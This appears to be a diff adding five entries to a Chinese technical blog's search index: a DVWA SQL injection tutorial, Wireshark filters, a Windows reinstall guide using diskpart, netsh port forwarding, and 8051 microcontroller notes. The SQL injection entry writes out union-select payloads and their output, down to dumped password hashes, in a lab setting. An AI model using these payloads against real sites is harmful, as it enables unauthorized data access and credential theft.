@@ -1,4 +1,87 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   
+    <entry>
+      <title><![CDATA[基础SQL注入]]></title>
+      <url>/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/</url>
+      <content type="text"><![CDATA[1 手工sql注入sql注入，就是用户通过浏览器提交的变量内容，后台应用程序对浏览器提交的内容并未进行检查过滤，直接拼接sql语句后去查询数据库，导致将数据库中的其它信息返回至用户界面中，造成数据库中其它未对用户授权的数据泄漏。1.1 DVWA Sql注入学习测试sql语句"SELECT first_name, last_name FROM users WHERE user_id = '$id';"1.1.1 返回内容正常ID: 1First name: adminSurname: admin1.1.2 返回查询所有记录ID: 1' or '1'='1First name: adminSurname: adminID: 1' or '1'='1First name: GordonSurname: BrownID: 1' or '1'='1First name: HackSurname: MeID: 1' or '1'='1First name: PabloSurname: PicassoID: 1' or '1'='1First name: BobSurname: Smith1.1.3 判断有多少个字段，修改order by 后面的字段值，直到数据库报错ID: 1' or 1=1 order by 2 #First name: adminSurname: adminID: 1' or 1=1 order by 2 #First name: GordonSurname: BrownID: 1' or 1=1 order by 2 #First name: HackSurname: MeID: 1' or 1=1 order by 2 #First name: PabloSurname: PicassoID: 1' or 1=1 order by 2 #First name: BobSurname: Smith执行结果说明，sql查询语句中只有两个字段1.1.4 确定显示的字段顺序ID: 1' union select 1,2 #First name: adminSurname: adminID: 1' union select 1,2 #First name: 1Surname: 21.1.5 获取当前数据库及版本ID: 1' union select version(),database() #First name: adminSurname: adminID: 1' union select version(),database() #First name: 10.1.26-MariaDB-0+deb9u1Surname: dvwa从返回结果中我们可以看出数据库的名称和版本号1.1.6 获取数据库中的表ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #First name: adminSurname: adminID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #First name: 1Surname: guestbook,users返回结果说明，数据库中存在了两张表为: guestbook,user1.1.7 获取表字段名称ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #First name: adminSurname: adminID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #First name: 1Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login1.1.8 获取表中数据ID: 1' union select group_concat(first_name),group_concat(password) from users #First name: adminSurname: adminID: 1' union select group_concat(first_name),group_concat(password) from users #First name: admin,Gordon,Hack,Pablo,BobSurname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99ID: 1' union select last_name,password from users #First name: adminSurname: adminID: 1' union select last_name,password from users #First name: adminSurname: 5f4dcc3b5aa765d61d8327deb882cf99ID: 1' union select last_name,password from users #First name: BrownSurname: e99a18c428cb38d5f260853678922e03ID: 1' union select last_name,password from users #First name: MeSurname: 8d3533d75ae2c3966d7e0d4fcc69216bID: 1' union select last_name,password from users #First name: PicassoSurname: 0d107d09f5bbe40cade3de5c71e9e9b7ID: 1' union select last_name,password from users #First name: SmithSurname: 5f4dcc3b5aa765d61d8327deb882cf99]]></content>
+      <categories>
+        
+          <category> 安全 </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> sql </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[WireShark过滤规则]]></title>
+      <url>/network/2018/12/19/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</url>
+      <content type="text"><![CDATA[1 WireShark过滤规则1.1 过滤IPip.dst == 1.1.1.1ip.src eq 192.168.120.184ip.addr eq 192.168.120.1841.2 过滤MAC地址eth.src == af:4f:3d:7f:2d:23eth.dst eq 56:8d:2a:3e:2c:03eth.addr eq 2e:0a:87:02:34:641.3 过滤端口tcp.port eq 22tcp.dstport == 80tcp.srcport eq 23udp.port eq 3389tcp.port &gt;= 1 and tcp.port &lt;= 10241.4 http模式过滤http.host == "www.myhost.com"http.request.method == "GET"http.request.method == "POST"http contains "test"1.5 包长度过滤udp.length eq 26tcp.len eq 94frame.len == 119]]></content>
+      <categories>
+        
+          <category> Network </category>
+        
+      </categories>
+      <tags>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[由Win10操作系统更换至Win7操作系统]]></title>
+      <url>/windows/2018/12/10/%E7%94%B1win10%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%8D%A2%E8%87%B3win7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
+      <content type="text"><![CDATA[1 更改系统1.1 安装系统准备在安装Win7系统之前，需要备份Win10操作系统所在磁盘中的所有用户数据，系统重新安装之后原有数据都将丢失。首先需要准备备好一个安装U盘或者安装光盘，并提前准备好硬盘、USB及网卡等必要的驱动程序，在安装过程或安装后可能会使用到。1.2 安装Win7系统一切准备工作做好后，就可以进行Win7系统的安装了，更改默认的启动方式，选择U盘或者光驱进入Win7安装界面。然后按照如下的操作方法进行磁盘格式的更改，成功之后就可以顺利的进行Win7系统的安装了):shift + F10Diskpartlist disk  //列出当前计算机上的所有物理磁盘select disk 1  //磁盘编号从0开始，这里选择了第二块磁盘clean  //清除物理磁盘所有信息convert mbr  //更改格式exitexit当做完上述操作之后就可以进行磁盘的分区，及系统的安装，如果找不到磁盘可以尝试加载磁盘驱动程序，后续的安装比较简单可以按照提示做即可。]]></content>
+      <categories>
+        
+          <category> Windows </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> Dos </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[Windows端口转发]]></title>
+      <url>/windows/2018/12/10/windows%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
+      <content type="text"><![CDATA[1 使用端口转发在Windows操作系统中有时候需要更改初始服务端口才能够访问时（防火墙阻断正常端口访问），更改软件端口又比较麻烦时，可以使用Windows操作系统自带的端口转发软件，或者其它情况下需要做端口转发时则可以使用一下此方法实现。添加:netsh interface portproxy add v4tov4 listenport=转发端口 listenaddress=本机IP connectport=目标端口 connectaddress=目标IP删除:netsh interface portproxy delete v4tov4 listenport=转发端口 listenaddress=本机IP]]></content>
+      <categories>
+        
+          <category> Windows </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> Dos </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[51单片机]]></title>
+      <url>/%E5%8D%95%E7%89%87%E6%9C%BA/2018/12/05/51%E5%8D%95%E7%89%87%E6%9C%BA/</url>
+      <content type="text"><![CDATA[1 单片机结构一台计算机由一下几部分组成：CPU、RAM、ROM、I/O设备。在个人计算机这些部分在集成在多个芯片上，而在单片机中这些都被集成到一块芯片中，单片机是一种控制芯片，一个微型的计算机。1.1 单片机引脚单片机的40个引脚大致可以分为4类：电源、时钟、控制、I/O引脚。1、电源VCC 芯片电源 +5VVSS 接地端2、时钟XTAL1、XTAL2 晶体振荡电路反向输入端和输出端3、控制线：控制线共有四根a、ALE/PROG:地址锁存允许/片内EPROM编程脉冲AEL功能：用来锁存P0口送出的低8位地址PROG功能：片内有EPROM的芯片，在EPROM编程期间，此引脚输入编程脉冲b、PSEN：外ROM读选通信号c、RST/VPD：复位/备用电源RST功能：复位信号输入端VPD功能：在VCC掉电情况下，使用备用电源d、EA/Vpp：内部ROM选择/片内EPROM编程电源EA功能：内外ROM选择端Vpp功能：片内有EPROM芯片，在EPROM编程期间，施加编程电源Vpp4、I/O线80C51共有4个8位并行I/O端口：P0、P1、P2、P3口，共有32个引脚，P3还具有第二功能，用于特殊信号输入输出和控制信号（输入控制总线）。1.2 特殊功能寄存器在单片机中有一些独立的存储单元用来控制定时器/计数器，串行I/O口等器件，被称为特殊功能寄存器（SFR）。特殊功能寄存器如下表：符号地址功能BF0HB寄存器ACCE0H累加器PSWD0H程序状态字IPB8H中断优先级控制寄存器P3B0HP3口锁存器IEA8H中断允许控制寄存器P2A0HP2口锁存器SBUF99H串行口锁存器SCON98H串行口控制寄存器P190HP1口锁存器TH18DH定时器/计数器1（高8位）TH08CH定时器/计数器1（低8位）TL18BH定时器/计数器0（高8位）TL08AH定时器/计数器0（低8位）TMOD89A定时器/计数器方式控制寄存器TCON88H定时器/计数器控制寄存器DPH83H数据地址指针（高8位）DPL82H数据地址指针（低8位）SP81H堆栈指针P080HP0口锁存器PCON87H电源控制寄存器2 单片机寻址方式与指令系统2.1 指令格式在MCS-51指令中，一般指令主要由操作码、操作数组成。指令应该有如下功能：1、操作码指明执行什么性质和类型的操作2、操作数指明操作的数本身或者是操作数所在的地址3、指定操作结果存放的地址2.2 寻址方式1、立即寻址操作数以指令形式出现，称作立即数，用#号的8位或者16位数来表示。MOV A, #60H    ;A &lt;- #60HMOV 30H, #40   ;30H单元 &lt;- #40H以上命令执行完成之后，累加器A中数据为立即数据60H，30H单元中数据为立即数40H。2、直接寻址指令中直接给出操作数的8位地址，能进行直接寻址的存储空间有SFR和片内RAM。MOV PSW, #20HPSW直接地址为D0H，在指令中可使用其名称MOV A, 30H30为直接给出的内部RAM地址。3、寄存器寻址INC DPTR    ;DPTR &lt;- DPTR+1ADD A, R2   ;A &lt;- A+R24、寄存器间接寻址以寄存器的内容为操作数的地址，在寄存器前加@用来区分。即以寄存器作为指针，可用来访问片内RAM和片外RAM，不能访问SFR。能作为间接寻址的寄存器有R0、R1、DPTR、SP，其中R0、R1是指所选中的工作寄存器，SP仅用于堆栈操作。MOV @R0, A访问片内RAM5、变址寻址变址寻址只能对程序存储器中的数据进行读取访问，在指令符号上采用MOVC的形式。6、相对寻址相对寻址是为实现程序的相对转移而设计。]]></content>
+      <categories>
+        
+          <category> 单片机 </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> C </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
 </search>
